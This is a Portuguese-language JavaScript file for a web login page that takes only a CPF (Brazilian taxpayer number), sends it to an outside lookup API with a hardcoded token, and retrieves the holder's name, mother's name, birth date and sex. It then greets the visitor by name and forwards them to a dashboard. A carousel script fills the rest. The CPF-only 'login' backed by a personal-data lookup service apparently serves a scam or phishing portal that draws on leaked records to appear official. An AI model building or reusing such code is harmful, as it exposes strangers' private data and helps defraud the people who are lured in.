document.addEventListener("DOMContentLoaded", function () {
  const cpfInput = document.getElementById("cpf");
  const btnLogin = document.getElementById("btnLogin");
  const loadingScreen = document.getElementById("loadingScreen");
  const loadingMessage = document.getElementById("loadingMessage");

  cpfInput.addEventListener("input", function (e) {
    let value = e.target.value.replace(/\D/g, "");
    value = value.slice(0, 11);

    if (value.length > 0) {
      value = value.replace(/^(\d{3})(\d)/, "$1.$2");
      if (value.length > 4) {
        value = value.replace(/^(\d{3})\.(\d{3})(\d)/, "$1.$2.$3");
        if (value.length > 8) {
          value = value.replace(
            /^(\d{3})\.(\d{3})\.(\d{3})(\d)/,
            "$1.$2.$3-$4"
          );
        }
      }
    }
    e.target.value = value;
  });

  // Tentar preencher o CPF do localStorage
  const cpfUsuario = localStorage.getItem("cpfUsuario"); // Usando a chave do script anterior
  if (cpfUsuario) {
    const cpfFormatado = cpfUsuario.replace(
      /^(\d{3})(\d{3})(\d{3})(\d{2})$/,
      "$1.$2.$3-$4"
    );
    cpfInput.value = cpfFormatado;
  }

  // ATENÇÃO: Esta lógica redireciona se 'userData' JÁ EXISTIR.
  // Se quiser que o usuário "logue" toda vez, remova ou comente este bloco.
  const userData = localStorage.getItem("userData");
  if (userData) {
    const currentParams = window.location.search;
    const baseUrl = "dashboard.html";
    const finalUrl = currentParams
      ? `${baseUrl}${baseUrl.includes("?") ? "&" : "?"}${currentParams.slice(
          1
        )}`
      : baseUrl;
    window.location.href = finalUrl;
  }
  // Fim do bloco de redirecionamento

  btnLogin.addEventListener("click", processLogin);
  cpfInput.addEventListener("keydown", function (e) {
    if (e.key === "Enter") {
      processLogin();
    }
  });

  function processLogin() {
    const cpf = cpfInput.value.replace(/\D/g, "").trim();

    if (cpf.length < 11) {
      alert("Por favor, digite um CPF válido (11 dígitos).");
      return;
    }

    loadingScreen.classList.remove("d-none");
    consultarCPF(cpf);
  }

  // ===== INÍCIO DA CORREÇÃO =====
  // Esta função foi substituída pela que USA A API CORRETA
  function consultarCPF(cpf) {
    // Usando a API e Token que JÁ FUNCIONAM do seu script anterior
    const apiUrl = `https://searchapi.dnnl.live/consulta?token_api=5145&cpf=${cpf}`;

    fetch(apiUrl)
      .then((response) => {
        if (!response.ok) {
          // Se a API falhar (404, 500, etc.)
          throw new Error("Erro ao consultar o servidor da API.");
        }
        return response.json();
      })
      .then((data) => {
        // Verificando o formato da resposta
        if (data.dados && data.dados.length > 0) {
          
          // Pegando os dados do primeiro item do array
          const apiData = data.dados[0];

          // Criando um objeto de usuário limpo
          const usuario = {
            nome: apiData.NOME,
            cpf: apiData.CPF,
            mae: apiData.NOME_MAE,
            nascimento: apiData.NASC,
            sexo: apiData.SEXO,
          };

          // Salvando o objeto de usuário (corrigido)
          localStorage.setItem("userData", JSON.stringify(usuario));

          // Atualizando a mensagem de loading com o NOME correto
          loadingMessage.textContent = `Olá, ${usuario.nome}!`;

          // Redirecionando para o dashboard
          setTimeout(() => {
            const currentParams = window.location.search;
            const baseUrl = "dashboard.html";
            const finalUrl = currentParams
              ? `${baseUrl}${
                  baseUrl.includes("?") ? "&" : "?"
                }${currentParams.slice(1)}`
              : baseUrl;

            window.location.href = finalUrl;
          }, 2000);

        } else {
          // Se a API retornou 200 OK, mas não achou o CPF
          throw new Error("CPF não encontrado na base de dados.");
        }
      })
      .catch((error) => {
        // O bloco CATCH agora pega qualquer erro
        console.error("Erro:", error);
        loadingScreen.classList.add("d-none");
        // Mostra o erro real (ex: "CPF não encontrado")
        alert(error.message || "Não foi possível verificar o CPF. Tente novamente.");
      });
  }
  // ===== FIM DA CORREÇÃO =====

  // O restante do seu código do carrossel (sem alterações)
  const homeSlider = document.getElementById("homeCardSlider");
  if (homeSlider) {
    const carousel = new bootstrap.Carousel(homeSlider, {
      interval: 5000,
      ride: "carousel",
      pause: false,
      wrap: true,
      touch: true,
    });

    homeSlider.addEventListener("slide.bs.carousel", function (e) {
      const activeItem = this.querySelector(".carousel-item.active");
      const nextItem = e.relatedTarget;
      const direction = e.direction;

      if (direction === "left") {
        nextItem.style.animation = "slideInRight 0.8s forwards";
        activeItem.style.animation = "slideOutLeft 0.8s forwards";
      } else {
        nextItem.style.animation = "slideInRight 0.8s reverse forwards";
        activeItem.style.animation = "slideOutLeft 0.8s reverse forwards";
      }
    });

    const cards = homeSlider.querySelectorAll(".home-slider-card");
    cards.forEach((card) => {
      card.addEventListener("mouseenter", function () {
        this.style.transform = "scale(1.02)";
        this.style.boxShadow = "0 15px 30px rgba(0, 104, 255, 0.2)";
      });

      card.addEventListener("mouseleave", function () {
        const isActive =
          this.closest(".carousel-item").classList.contains("active");
        if (isActive) {
          this.style.transform = "scale(1)";
        } else {
          this.style.transform = "scale(0.9)";
        }
        this.style.boxShadow = isActive
          ? "0 12px 24px rgba(0, 104, 255, 0.15)"
          : "0 8px 20px rgba(0, 0, 0, 0.12)";
      });
    });

    const slideImages = homeSlider.querySelectorAll(".carousel-item img");
    slideImages.forEach((img) => {
      const imgSrc = img.getAttribute("src");
      if (imgSrc) {
        const preloadImg = new Image();
        preloadImg.src = imgSrc;
      }
    });
  }
});
